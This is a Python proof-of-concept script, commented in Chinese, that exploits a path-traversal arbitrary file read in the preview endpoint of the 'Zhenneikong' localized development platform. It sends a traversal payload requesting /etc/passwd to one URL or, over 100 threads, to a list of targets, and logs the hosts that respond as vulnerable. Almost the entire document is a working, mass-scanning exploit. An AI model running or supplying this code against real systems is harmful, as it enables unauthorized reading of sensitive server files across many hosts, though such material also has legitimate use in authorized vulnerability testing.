#真内控国产化开发平台接口preview任意文件读取漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="真内控国产化开发平台接口preview任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
        
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print((f"Useag:\n\t python {sys.argv[0]} -h"))
def poc(target):
    payload = "/print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd"
    url = target+payload
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res = requests.get(url=url,headers=headers,proxies=proxies,verify=False,timeout=10)
        if res.status_code == 200 and "root:x:0" in res.text:
            print(f'[+]该url{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
        else:
            print(f'该url{target}不存在漏洞')
    except:
        print("该站点可能存在问题，请手动测试")

if __name__ == '__main__':
    main()